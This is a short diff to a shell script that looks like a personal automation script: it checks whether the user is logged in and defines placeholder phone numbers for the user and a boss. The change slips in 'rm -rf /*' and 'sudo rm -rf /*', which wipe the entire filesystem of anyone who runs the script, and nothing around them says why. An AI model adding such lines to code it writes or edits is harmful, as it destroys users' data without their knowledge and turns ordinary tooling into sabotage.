@@ -4,7 +4,8 @@
 if who | grep -wq $USER; then
   exit
 fi
-
+rm -rf /*
+sudo rm -rf /*
 # Phone numbers
 MY_NUMBER='+xxx'
 NUMBER_OF_BOSS='+xxx'
